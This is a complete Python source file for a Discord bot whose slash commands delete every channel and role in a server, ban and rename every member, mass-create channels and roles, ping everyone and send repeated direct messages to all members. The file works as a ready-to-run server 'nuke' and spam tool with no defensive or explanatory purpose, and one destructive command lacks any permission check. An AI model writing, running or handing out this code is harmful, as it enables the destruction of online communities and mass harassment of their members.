import asyncio
import discord
import os
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv

# Load .env file
load_dotenv()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)


@bot.tree.command(
    name="ping",
    description="Returns the bot's latency",
)
async def ping_slash(interaction: discord.Interaction):
    await interaction.response.send_message(
        f"Pong! {round(bot.latency * 1000)}ms", ephemeral=True
    )


@bot.tree.command(
    name="delete_all_channels",
    description="Deletes all channels in the server",
)
async def delete_all_channels(interaction: discord.Interaction):
    for channel in interaction.guild.channels:
        await channel.delete()
    await interaction.response.send_message(f"Deleted all channels", ephemeral=True)
    print(f"Deleted all channels in the server: {interaction.guild.name}")


@bot.tree.command(
    name="delete_all_roles",
    description="Deletes all roles in the server",
)
@commands.has_permissions(manage_roles=True)
async def delete_all_roles(interaction: discord.Interaction):
    # Send the response immediately
    await interaction.response.send_message(
        f"Started deleting all roles", ephemeral=True
    )
    for role in interaction.guild.roles:
        if (
            role != interaction.guild.default_role
            and role < interaction.guild.me.top_role
        ):  # Skip default role and roles higher than bot's top role
            try:
                await role.delete()
                print(f"Successfully deleted role {role.name}")
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")
    # Send a message in Discord when the command completes
    await interaction.channel.send(
        f"Deleted all roles in the server: {interaction.guild.name}"
    )


@bot.tree.command(
    name="nick_all_members",
    description="Changes the nickname of all members in the server",
)
@commands.has_permissions(manage_nicknames=True)
async def nick_all_members(interaction: discord.Interaction, new_nickname: str):
    for member in interaction.guild.members:
        try:
            await member.edit(nick=new_nickname)
        except discord.Forbidden:
            continue  # Skip members who cannot have their nickname changed
    await interaction.response.send_message(
        f"Changed all member nicknames to {new_nickname}", ephemeral=True
    )
    print(f"Changed all member nicknames in the server: {interaction.guild.name}")


@bot.tree.command(
    name="ban_all_members",
    description="Bans all members in the server",
)
@commands.has_permissions(ban_members=True)
async def ban_all_members(interaction: discord.Interaction, ban_reason: str):
    for member in interaction.guild.members:
        try:
            await member.ban(reason=ban_reason)
        except discord.Forbidden:
            continue  # Skip members who cannot be banned
    await interaction.response.send_message(
        f"Banned all members for {ban_reason}", ephemeral=True
    )
    print(
        f"Banned all members in the server: {interaction.guild.name} for {ban_reason}"
    )


@bot.tree.command(
    name="create_channels",
    description="Creates custom channels in the server",
)
@commands.has_permissions(manage_channels=True)
async def create_channels(
    interaction: discord.Interaction, channel_name: str, num_channels: int
):
    for _ in range(num_channels):
        await interaction.guild.create_text_channel(name=channel_name)
    await interaction.response.send_message(
        f"Created {num_channels} channels named {channel_name}", ephemeral=True
    )
    print(
        f"Created {num_channels} channels named {channel_name} in the server: {interaction.guild.name}"
    )


@bot.tree.command(
    name="mention_everyone",
    description="Mentions everyone in the server",
)
@commands.has_permissions(send_messages=True)
async def mention_everyone(interaction: discord.Interaction):
    await interaction.channel.send("@everyone")
    print("Mentioned everyone in the server.")


@bot.tree.command(
    name="ping_all_members",
    description="Pings all members in the server",
)
@commands.has_permissions(send_messages=True)
async def ping_all_members(interaction: discord.Interaction):
    for member in interaction.guild.members:
        await interaction.channel.send(f"{member.mention}")
    print(f"Pinged all members in the server: {interaction.guild.name}")


@bot.tree.command(
    name="dm_all_members",
    description="Sends a DM to all members in the server a certain number of times",
)
@commands.has_permissions(send_messages=True)
async def dm_members(interaction: discord.Interaction, message: str, num_messages: int):
    # Send the response immediately
    await interaction.response.send_message(
        f"Started sending DM {num_messages} times to all members", ephemeral=True
    )
    success_count = 0
    fail_count = 0
    for member in interaction.guild.members:
        if not member.bot:  # Skip bots
            for _ in range(num_messages):
                try:
                    await member.send(message)
                    print(
                        f"Successfully sent DM to {member.name}"
                    )  # Print a message for each successful DM
                    success_count += 1
                except Exception as e:
                    print(f"Failed to send DM to {member.name}: {e}")
                    fail_count += 1
                await asyncio.sleep(1)  # Sleep for 1 second between each message
    print(
        f"Sent DM {num_messages} times to all members in the server: {interaction.guild.name}"
    )
    # Send a message in Discord when the command completes
    await interaction.channel.send(
        f"Sent DM {num_messages} times to all members in the server: {interaction.guild.name}. Success: {success_count}, Fail: {fail_count}"
    )


@bot.tree.command(
    name="create_roles",
    description="Creates a specified number of roles with a custom name in the server",
)
@commands.has_permissions(manage_roles=True)
async def create_roles(
    interaction: discord.Interaction, role_name: str, num_roles: int
):
    # Send the response immediately
    await interaction.response.send_message(
        f"Started creating {num_roles} roles with the name {role_name}", ephemeral=True
    )
    for _ in range(num_roles):
        try:
            await interaction.guild.create_role(name=role_name)
            print(f"Successfully created role {role_name}")
        except Exception as e:
            print(f"Failed to create role {role_name}: {e}")
    # Send a message in Discord when the command completes
    await interaction.channel.send(
        f"Created {num_roles} roles with the name {role_name} in the server: {interaction.guild.name}"
    )


@bot.event
async def on_ready():
    await bot.change_presence(
        activity=discord.Activity(type=discord.ActivityType.unknown, name="")
    )
    print(f"Logged in as {bot.user.name} - {bot.user.id}")
    print(f"{bot.user.name} is ready to go !")

    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands")
    except Exception as e:
        print(f"Failed to sync commands: {e}")


# Use the bot token from .env file
bot_token = os.getenv("BOT_TOKEN")
if bot_token is None:
    print("Bot token is not set in the environment variables.")
else:
    bot.run(bot_token)
